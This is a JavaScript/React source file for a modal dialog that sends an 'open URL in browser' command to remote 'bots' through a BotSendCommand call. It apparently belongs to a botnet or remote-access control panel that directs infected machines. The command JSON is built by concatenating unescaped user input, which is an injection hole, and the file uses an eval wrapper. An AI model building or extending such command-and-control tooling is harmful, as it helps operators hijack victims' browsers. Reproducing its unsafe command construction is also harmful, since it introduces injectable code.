import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';


//{"this":"~command~","name":"openUrl","url":"https://yandex.ru"}
class OpenLink extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          url: ''
        }
    }

    onChangeUrl = (e) => {
        this.setState({ 
            url: e.target.value.substring(0,40)
        });
    }

    onClickOpenURL = (e) => {
        try_eval('$.notify("Added command [open_url]", "info");');
        SettingsContext.BotSendCommand('{"cmd":"url","u":"' + this.state.url + '"}');
        this.setState({ 
            url: ''
        });
    }

    render () {
        return (
            <React.Fragment>
                <div class="modal fade" id="modalOpenURL" tabindex="-1" role="dialog" aria-labelledby="modalOpenURL" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Open URL on browser</h5>

                            <div class="modal-body">
                            <input class="form-control" value={this.state.url} onChange={this.onChangeUrl} placeholder="https://google.com/" />
    
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickOpenURL} class="btn btn-outline-primary"  data-dismiss="modal">Open URL on browser</button>
                            </div>
                        </div>
                    </div>
                </div>
            </React.Fragment>
        );
    }
}

export default OpenLink;